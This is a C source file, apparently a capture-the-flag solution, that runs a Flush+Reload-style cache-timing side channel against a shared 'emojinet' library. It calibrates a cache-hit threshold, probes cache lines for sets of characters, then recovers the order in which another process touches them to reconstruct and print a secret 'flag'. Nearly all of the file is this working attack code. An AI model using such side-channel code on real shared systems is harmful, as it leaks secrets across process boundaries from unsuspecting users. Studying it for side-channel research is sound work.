#include <locale.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <wchar.h>
#include <string.h>
#include "cacheutils.h"
#include "emojinet.h"

#define TOTAL_TESTS 50
#define PROBE_AMMOUNT	    70
#define PROBE_AMMOUNT_ORDER 400
#define TIME_TO_SLEEP 200
#define G	160


char globalVar[4096]={1,4,7,8,5,9,1};
int threshold;

//lets compute the limit of what is cache and what is main memory
void computeThreshold(){

  unsigned long t1,t2;
  unsigned long count=0;
  double total_access,total_evict;

  total_access=0;
  total_evict=0;
  for(unsigned i=0;i<(TOTAL_TESTS *2);i++){
    if (i%2==0){
      maccess((void *)&globalVar[44]);
    }
    t1=probe_timing((void *)&globalVar[44]);
    count++;
    if (i%2==0){
      //printf("time w acess: %lu\n",t1);
      total_access+=(double)t1;

    }
    else{
      //printf("time no acess: %lu\n",t1);
      total_evict+=(double)t1;
    }
    //ensures that clflush will be called before entering in a new loop test
    asm __volatile__("mfence\nlfence\n");
  
  }
  total_access=total_access/TOTAL_TESTS;
  total_evict=total_evict/TOTAL_TESTS;
  printf("avg cached=0x%x\n",(int)total_access);
  printf("avg evicted=0x%x\n",(int)total_evict);
  
  threshold= (int)(total_evict*0.5+total_access*0.5);
}

//lets shuffle the order to avoid prefetcher preditcion
void randomize(unsigned char *string){

	size_t len=strlen(string);
	int random;
	char tmp;
	for(int i=0;string[i]!='\0';i++){
	  random=rand()%len;
	  tmp=string[i];
	  string[i]=string[random];
	  string[random]=tmp;
	  if (i >2){
	    if((string[i]-string[i-1])<2){
	      i--;
	      
	    }
	  }
	
	}


}
void watch(wchar_t *base,unsigned char *set,int *output){

	register unsigned j,i;
	register unsigned used;
	register unsigned long time_fast;

	j=0;
	while (j<PROBE_AMMOUNT){
	  
	  for (i=0;set[i]!='\0';i++){
		used=set[i]-'-';

		time_fast=probe_timing((char *)(&base[G*used]));
	 	if(time_fast < threshold ){
			output[used]++;
			j++;
		}
		
	  }

	}
}
void watchOrder(wchar_t *base,unsigned char *set,char *output){

	register unsigned j,i;
	register unsigned used;
	register unsigned long time_fast;

	j=0;
	while (j<PROBE_AMMOUNT_ORDER){
	  
	  for (i=0;set[i]!='\0';i++){
		used=set[i]-'-';

		time_fast=probe_timing((char *)(&base[G*used]));
	 	if(time_fast < threshold ){
			output[j]=used+'-';
			j++;
		}	
	  }
	}
	output[j]='\0';
}

int main(){
	wchar_t *base;
	int i,j;
	//'}' - '-' = 0x50
	//total of chars to test
	int dict[0x52];
	unsigned char valids[0x52];
	char flag[PROBE_AMMOUNT_ORDER+1];

	computeThreshold();
	printf("using threshold 0x%x \n",threshold);

	base=getEmojis();
	memset((void *)dict,0,sizeof(int)*0x52);

	unsigned char set0[]="M\\AV/K?e0DkC";
	unsigned char set1[]="G]bYt|NWwJC";
	unsigned char set2[]="ongP9H6vhzC";
	//removed the '-' from list because it was fuzzing our output, 
	//maybe becouse it's the first char of the emoji array
	//unsigned char set3[]="p-xRQ.2rXUC";
	unsigned char set3[]="pxRQ.2rXUC";
	unsigned char set4[]=">;71=`4l5jC";
	unsigned char set5[]="d3^B@{[L<fC";
	unsigned char set6[]="uSyTOsZi8C";
	unsigned char set7[]="cIEa_mqF}:C";


	watch(base,set0,dict);
	watch(base,set1,dict);
	watch(base,set2,dict);
	watch(base,set3,dict);
	watch(base,set4,dict);
	watch(base,set5,dict);
	watch(base,set6,dict);
	watch(base,set7,dict);
	
	
	j=0;
	for (i=0;i<0x51;i++){
	  if(dict[i]>4){
            valids[j]=(char)(i+'-');
	    j++;
	  }
	}
	valids[j]='\0';
	
	printf("valid chars: %s\n",valids);
	
	srand(time(NULL));
	randomize(valids);
	
	watchOrder(base,valids,flag);
	flag[PROBE_AMMOUNT_ORDER]='\0';
	printf("flag here: %s\n",flag);

	return 0;

}

